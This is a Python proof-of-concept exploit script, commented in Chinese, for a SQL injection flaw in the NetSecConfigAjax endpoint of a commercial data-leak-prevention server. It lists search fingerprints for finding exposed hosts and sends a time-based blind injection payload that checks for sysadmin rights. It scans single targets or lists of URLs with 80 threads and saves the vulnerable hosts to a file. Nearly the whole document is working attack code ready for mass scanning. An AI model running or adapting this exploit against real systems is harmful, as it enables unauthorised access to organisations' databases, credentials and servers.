# -*- coding: utf-8 -*-
# 某赛通数据泄露防护(DLP)系统 NetSecConfigAjax SQL注入漏洞
# body="CDGServer3" || title="电子文档安全管理系统" || cert="esafenet" || body="/help/getEditionInfo.jsp" || body="/CDGServer3/index.jsp"
# 产品简介:某赛通新一代数据泄露防护系统（简称 DLP），以服务企事业单位进行数据资产梳理、数据安全防护为目标。系统采用平台化管理，将终端DLP、网络DLP、邮件DLP、存储扫描DLP、API 接口DLP 进行统一管理，模块化控制。将对数据进行分类分级扫描，实现终端数据资产梳理、文件服务器数据梳理、数据库数据资产梳理、数据加密防护、数据外发监测、终端运维管理、邮件外发控制、数据水印、端口管控。
# 漏洞概述:某赛通数据泄露防护(DLP)系统NetSecConfigAjax接口处存在sql注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """ 
                \x1b[38m██╗   ██╗███████╗      ██████╗ ██╗     ██████╗ 
                \x1b[36m╚██╗ ██╔╝██╔════╝      ██╔══██╗██║     ██╔══██╗
                \x1b[34m ╚████╔╝ ███████╗█████╗██║  ██║██║     ██████╔╝
                \x1b[35m  ╚██╔╝  ╚════██║╚════╝██║  ██║██║     ██╔═══╝ 
                \x1b[31m   ██║   ███████║      ██████╔╝███████╗██║     
                \x1b[33m   ╚═╝   ╚══════╝      ╚═════╝ ╚══════╝╚═╝     
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    --author:Kucei  --Version:某赛通数据泄露防护(DLP)系统 NetSecConfigAjax SQL注入漏洞
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
\x1b[0m"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser('某赛通数据泄露防护(DLP)系统_NetSecConfigAjax_SQL注入漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()

    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list =[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = "/CDGServer3/NetSecConfigAjax;Service"
    headers = {
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Cookie': 'JSESSIONID=BFFA734FFFC1D940FA2710CD18F4CA23',
        'Connection': 'close',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '99',
    }
    # proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080',}
    data = "command=updateNetSec&state=123';if (select IS_SRVROLEMEMBER('sysadmin'))=1 WAITFOR DELAY '0:0:6'--"
    try :
        response = requests.post(url=target+url_payload,headers=headers,data=data,verify=False,timeout=7)
        # print(response.status_code)
        # print(response.text)
        time = response.elapsed.total_seconds()
        if response.status_code == 200 and time > 6:
            print( f"[+] {target} 存在漏洞！\n")
            with open('YS-DLP_NetSecConfigAjax-SQL.txt','a',encoding='utf-8')as f:
                f.write(target+url_payload+'\n')
                return True
        else:
            print("[-] 不存在漏洞！！")
            return False
    except Exception:
        print(target+"站点连接异常")

if __name__ == '__main__':
    main()